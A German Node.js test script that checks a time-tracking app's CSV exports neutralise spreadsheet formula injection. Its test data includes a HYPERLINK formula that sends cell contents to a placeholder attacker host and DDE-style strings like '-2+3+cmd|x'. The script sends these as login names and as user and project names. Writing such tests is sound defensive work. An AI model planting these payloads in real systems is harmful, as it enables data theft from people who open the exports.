// CSV-Exporte: Zellen, die wie eine Formel beginnen, kommen entschärft in die Datei — Zahlen bleiben Zahlen.
//
// Sicherheitsprüfung vom 10.11.2026, P2: Excel und LibreOffice werten eine Zelle als Formel aus,
// wenn sie mit = + - oder @ beginnt, auch in einer CSV-Datei. Der Benutzername einer FEHLANMELDUNG
// steht im Audit-Protokoll — wer dort „=HYPERLINK(…)" eintippte, legte dem Admin ohne jede
// Anmeldung eine Formel in den Export.
//
// Geprüft wird der Baustein (csv.js) und jeder der drei Exporte, die ihn benutzen: Audit-Protokoll,
// Projekt-Einträge, Lohn-Export. Der Test zerlegt die Dateien mit einem EIGENEN Zerleger.
//   node tests/csv-formeln.js
const { spawn } = require('child_process');
const http = require('http'); const fs = require('fs'); const path = require('path');
const { csvZelle } = require('../csv');

const PORT = 3398, DB = '/tmp/csv-formeln.db', LOG = '/tmp/csv-formeln-srv.log';
const SECRET = 'test-secret-mindestens-32-zeichen-lang';
const sleep = ms => new Promise(r => setTimeout(r, ms));
let pass = 0, fail = 0;
const ok = (n, c, e) => c ? (pass++, console.log('  ✓ ' + n)) : (fail++, console.log('  ✗ ' + n + (e ? '  → ' + e : '')));

function req(method, p, token, body) {
  return new Promise((resolve) => {
    const data = body ? JSON.stringify(body) : null;
    const r = http.request({ host: 'localhost', port: PORT, path: p, method, headers: {
      'Content-Type': 'application/json', ...(token ? { Authorization: 'Bearer ' + token } : {}),
      ...(data ? { 'Content-Length': Buffer.byteLength(data) } : {}),
    } }, (res) => { let s = ''; res.on('data', d => s += d); res.on('end', () => { let j = null; try { j = JSON.parse(s); } catch (_) {} resolve({ status: res.statusCode, body: j, text: s }); }); });
    r.on('error', () => resolve({ status: 0, text: '' })); if (data) r.write(data); r.end();
  });
}

// Zeichen für Zeichen, damit auch Zeilenumbrüche INNERHALB einer Zelle die Zeile nicht zerreißen.
function parseCsv(text) {
  const t = text.replace(/^﻿/, '');
  const zeilen = []; let zeile = []; let cur = ''; let inQ = false;
  for (let i = 0; i < t.length; i++) {
    const c = t[i];
    if (inQ) {
      if (c === '"' && t[i + 1] === '"') { cur += '"'; i++; }
      else if (c === '"') inQ = false;
      else cur += c;
    } else if (c === '"') inQ = true;
    else if (c === ';') { zeile.push(cur); cur = ''; }
    else if (c === '\r' && t[i + 1] === '\n') { zeile.push(cur); zeilen.push(zeile); zeile = []; cur = ''; i++; }
    else cur += c;
  }
  zeile.push(cur); zeilen.push(zeile);
  return zeilen;
}

// Die Regel, wie eine Tabellenkalkulation sie anwendet — bewusst NICHT aus csv.js übernommen.
const istZahl = (s) => /^[+-]?\d+([.,]\d+)?$/.test(s);
const waereFormel = (s) => /^\s*[=+\-@]/.test(s) || /^[\t\r]/.test(s);
const gefaehrlich = (zeilen) => zeilen.flat().filter(z => waereFormel(z) && !istZahl(z));

function bausteinPruefen() {
  console.log('── Baustein csvZelle ──');
  const tabelle = [
    // Eingabe, erwartete Zelle, Beschreibung
    ['=1+1', `"'=1+1"`, 'Gleichheitszeichen'],
    ['=HYPERLINK("http://x.example";"Klick")', `"'=HYPERLINK(""http://x.example"";""Klick"")"`, 'Formel mit Anführungszeichen (verdoppelt UND entschärft)'],
    ['+49 170 1234567', `"'+49 170 1234567"`, 'Telefonnummer mit Plus (keine reine Zahl)'],
    ['-2+3+cmd|x', `"'-2+3+cmd|x"`, 'Minus am Anfang, dahinter mehr als eine Zahl'],
    ['@SUM(A1:A9)', `"'@SUM(A1:A9)"`, 'At-Zeichen'],
    ['\t=1+1', `"'\t=1+1"`, 'Tabulator davor'],
    ['\r=1+1', `"'\r=1+1"`, 'Wagenrücklauf davor'],
    // Tabulator und Wagenrücklauf zählen auch OHNE Formelzeichen dahinter (OWASP führt sie eigens auf).
    ['\tcmd', `"'\tcmd"`, 'Tabulator am Anfang, dahinter kein Formelzeichen'],
    ['\rcmd', `"'\rcmd"`, 'Wagenrücklauf am Anfang, dahinter kein Formelzeichen'],
    ['   =1+1', `"'   =1+1"`, 'Leerzeichen davor'],
    ['\n=1+1', `"'\n=1+1"`, 'Zeilenumbruch davor'],
    ['-', `"'-"`, 'einzelnes Minus'],
    ['- siehe oben', `"'- siehe oben"`, 'Freitext mit Spiegelstrich'],
    ['-3,5', '"-3,5"', 'negative Zahl mit Komma bleibt'],
    ['-3.5', '"-3.5"', 'negative Zahl mit Punkt bleibt'],
    ['+5', '"+5"', 'Zahl mit Pluszeichen bleibt'],
    ['-176', '"-176"', 'negative ganze Zahl bleibt'],
    [-3.5, '"-3.5"', 'echte negative Zahl bleibt'],
    [0, '"0"', 'Null bleibt'],
    ['-3,5+1', `"'-3,5+1"`, 'Zahl mit Anhang ist keine reine Zahl'],
    ['-1e5', `"'-1e5"`, 'Exponentialschreibweise gilt nicht als reine Zahl'],
    ['07:00-16:00', '"07:00-16:00"', 'Minus in der Mitte bleibt'],
    ['a=b', '"a=b"', 'Gleichheitszeichen in der Mitte bleibt'],
    ['Müller & Söhne', '"Müller & Söhne"', 'gewöhnlicher Text bleibt'],
    ["'schon mit Hochkomma", `"'schon mit Hochkomma"`, 'vorhandenes Hochkomma wird nicht verdoppelt'],
    ['', '""', 'leere Zelle'],
    [null, '""', 'null'],
    [undefined, '""', 'undefined'],
  ];
  for (const [ein, soll, was] of tabelle) {
    const ist = csvZelle(ein);
    ok(was, ist === soll, JSON.stringify(ist) + ' statt ' + JSON.stringify(soll));
  }
}

(async () => {
  bausteinPruefen();

  try { fs.unlinkSync(DB); } catch (_) {}
  const lg = fs.openSync(LOG, 'w');
  const srv = spawn('node', ['server.js'], { cwd: path.join(__dirname, '..'),
    env: { ...process.env, PORT: String(PORT), DB_PATH: DB, JWT_SECRET: SECRET }, stdio: ['ignore', lg, lg] });
  try {
    for (let i = 0; i < 60; i++) { if ((await req('GET', '/health')).status === 200) break; await sleep(150); }
    const apw = (fs.readFileSync(LOG, 'utf8').match(/admin\s+->\s+(\S+)/) || [])[1];
    const tok = async (u, pw = 'Test1234!') => ((await req('POST', '/api/auth/login', null, { username: u, password: pw })).body || {}).token;
    const admin = await tok('admin', apw);
    ok('Admin angemeldet', !!admin);

    const FORMEL = '=HYPERLINK("http://boese.example/?x="&A1;"Hier klicken")';
    const mk = async (o) => {
      const r = await req('POST', '/api/users', admin, { password: 'Test1234!', role: 'mitarbeiter',
        hours_mon: 8, hours_tue: 8, hours_wed: 8, hours_thu: 8, hours_fri: 8, target_hours_per_week: 40, ...o });
      if (!r.body || !r.body.user) ok('Konto ' + o.username + ' angelegt', false, r.status + ' ' + JSON.stringify(r.body));
      return r.body.user;
    };
    // Namen, wie sie ein Chef (oder die Person selbst) eintragen könnte.
    const plus = await mk({ username: 'formel_plus', name: '+49 170 Beispiel', personnel_no: '=1+1' });
    const at = await mk({ username: 'formel_at', name: '@SUM(1+1)', personnel_no: '-7' });
    const brav = await mk({ username: 'formel_brav', name: 'Brav Beispiel', personnel_no: '0042' });
    ok('drei Testkonten angelegt', !!plus && !!at && !!brav);

    console.log('── Audit-Export: Formel im Benutzernamen einer Fehlanmeldung ──');
    let r = await req('POST', '/api/auth/login', null, { username: FORMEL, password: 'egal' });
    ok('Fehlanmeldung mit Formel als Benutzername → 401', r.status === 401, String(r.status));
    r = await req('POST', '/api/auth/login', null, { username: '@SUM(1+1)*cmd', password: 'egal' });
    r = await req('POST', '/api/auth/login', null, { username: '\t=1+1', password: 'egal' });
    await tok('formel_at');   // eine Zeile mit dem Namen „@SUM(1+1)" in der Spalte „Name"
    r = await req('GET', '/api/audit/export', admin);
    ok('Audit-Export liefert 200', r.status === 200, String(r.status));
    let zeilen = parseCsv(r.text);
    ok('Kopfzeile unverändert', zeilen[0].join('|') === 'Zeit|Aktion|Benutzername|Name|Details|IP', zeilen[0].join('|'));
    const fehlZeile = zeilen.find(z => z[1] === 'login_failed' && z[2].includes('HYPERLINK'));
    ok('die Fehlanmeldung steht im Export', !!fehlZeile);
    ok('ihr Benutzername beginnt mit dem Hochkomma', !!fehlZeile && fehlZeile[2] === "'" + FORMEL, fehlZeile && fehlZeile[2]);
    ok('Tabulator vor der Formel: ebenfalls entschärft', zeilen.some(z => z[2] === "'\t=1+1"));
    ok('Spalte „Name" mit @ am Anfang: entschärft', zeilen.some(z => z[3] === "'@SUM(1+1)"), JSON.stringify(zeilen.filter(z => z[3].includes('SUM')).map(z => z[3]).slice(0, 2)));
    let rest = gefaehrlich(zeilen);
    ok('im ganzen Audit-Export beginnt keine Zelle wie eine Formel', rest.length === 0, JSON.stringify(rest.slice(0, 3)));
    ok('die Datei selbst enthält kein „;"=" und kein „;"@"', !/(^|;|\n)"[=@]/.test(r.text.replace(/^﻿/, '')));

    console.log('── Projekt-Export: Formel im Projekt- und im Personennamen ──');
    const proj = ((await req('POST', '/api/projects', admin, { name: '=1+1' })).body || {}).project;
    ok('Projekt mit Formel-Namen angelegt', !!proj, JSON.stringify(proj));
    const tPlus = await tok('formel_plus'), tAt = await tok('formel_at');
    await req('POST', '/api/entries', tPlus, { date: '2026-08-03', time_from: '07:00', time_to: '15:00', break_minutes: 30, project_id: proj.id });
    await req('POST', '/api/entries', tAt, { date: '2026-08-04', time_from: '08:00', time_to: '12:00', break_minutes: 0, project_id: proj.id });
    r = await req('GET', `/api/projects/${proj.id}/entries.csv`, admin);
    ok('Projekt-Export liefert 200', r.status === 200, String(r.status));
    zeilen = parseCsv(r.text);
    ok('Titelzeile: Projektname entschärft', zeilen[0][0] === 'Projekt' && zeilen[0][1] === "'=1+1", JSON.stringify(zeilen[0]));
    const daten = zeilen.slice(3, -1);
    ok('zwei Datenzeilen', daten.length === 2, String(daten.length));
    ok('Name mit Plus: entschärft', daten[0] && daten[0][0] === "'+49 170 Beispiel", daten[0] && daten[0][0]);
    ok('Name mit @: entschärft', daten[1] && daten[1][0] === "'@SUM(1+1)", daten[1] && daten[1][0]);
    ok('Uhrzeit „07:00-15:00" unverändert', daten[0] && daten[0][2] === '07:00-15:00', daten[0] && daten[0][2]);
    ok('Stunden bleiben Zahlen (7,5 und 4)', daten[0] && daten[0][4] === '7,5' && daten[1][4] === '4', JSON.stringify(daten.map(d => d[4])));
    ok('Summe unverändert 11,5', zeilen[zeilen.length - 1][4] === '11,5', zeilen[zeilen.length - 1][4]);
    rest = gefaehrlich(zeilen);
    ok('im ganzen Projekt-Export beginnt keine Zelle wie eine Formel', rest.length === 0, JSON.stringify(rest.slice(0, 3)));

    console.log('── Lohn-Export: Namen entschärft, negativer Saldo bleibt eine Zahl ──');
    // Ein Monat sicher in der Zukunft, nichts gebucht → Soll > 0, Ist 0, Saldo negativ.
    const MONAT = `${new Date().getFullYear() + 1}-03`;
    r = await req('GET', `/api/payroll/monat.csv?month=${MONAT}`, admin);
    ok('Lohn-Export liefert 200', r.status === 200, String(r.status));
    zeilen = parseCsv(r.text);
    const kopf = zeilen[0]; const sp = (n) => kopf.indexOf(n);
    ok('Spalten Name, Personalnummer, Saldo vorhanden', sp('Name') >= 0 && sp('Personalnummer') >= 0 && sp('Saldo') >= 0, JSON.stringify(kopf.slice(0, 7)));
    const zPlus = zeilen.find(z => z[sp('Name')].includes('49 170 Beispiel'));
    const zAt = zeilen.find(z => z[sp('Name')].includes('SUM(1+1)'));
    const zBrav = zeilen.find(z => z[sp('Name')] === 'Brav Beispiel');
    ok('alle drei Personen stehen im Export', !!zPlus && !!zAt && !!zBrav);
    ok('Name mit Plus: entschärft', !!zPlus && zPlus[sp('Name')] === "'+49 170 Beispiel", zPlus && zPlus[sp('Name')]);
    ok('Personalnummer „=1+1": entschärft', !!zPlus && zPlus[sp('Personalnummer')] === "'=1+1", zPlus && zPlus[sp('Personalnummer')]);
    ok('Name mit @: entschärft', !!zAt && zAt[sp('Name')] === "'@SUM(1+1)", zAt && zAt[sp('Name')]);
    ok('Personalnummer „-7" ist eine reine Zahl und bleibt', !!zAt && zAt[sp('Personalnummer')] === '-7', zAt && zAt[sp('Personalnummer')]);
    ok('Personalnummer „0042" behält die führenden Nullen', !!zBrav && zBrav[sp('Personalnummer')] === '0042', zBrav && zBrav[sp('Personalnummer')]);
    const saldo = zBrav ? zBrav[sp('Saldo')] : '';
    ok('Saldo ist negativ und beginnt mit dem Minus — ohne Hochkomma', /^-\d+(,\d+)?$/.test(saldo), JSON.stringify(saldo));
    ok('… und lässt sich als Zahl lesen', Number(saldo.replace(',', '.')) < 0, saldo);
    const summe = zeilen.find(z => z[sp('Name')] === 'Summe');
    ok('Summenzeile: Saldo ebenfalls eine negative Zahl', !!summe && /^-\d+(,\d+)?$/.test(summe[sp('Saldo')]), summe && summe[sp('Saldo')]);
    rest = gefaehrlich(zeilen);
    ok('im ganzen Lohn-Export beginnt keine Zelle wie eine Formel', rest.length === 0, JSON.stringify(rest.slice(0, 3)));
    const hochkomma = zeilen.slice(1).flat().filter(z => z.startsWith("'"));
    ok('ein Hochkomma tragen nur die drei präparierten Zellen', hochkomma.length === 3, JSON.stringify(hochkomma));
  } catch (e) { ok('Ablauf ohne Ausnahme', false, e && e.stack); }
  finally { srv.kill(); try { fs.unlinkSync(DB); } catch (_) {} }
  console.log(`\nCSV-Formeln: ${pass} bestanden, ${fail} fehlgeschlagen`);
  process.exit(fail ? 1 : 0);
})();
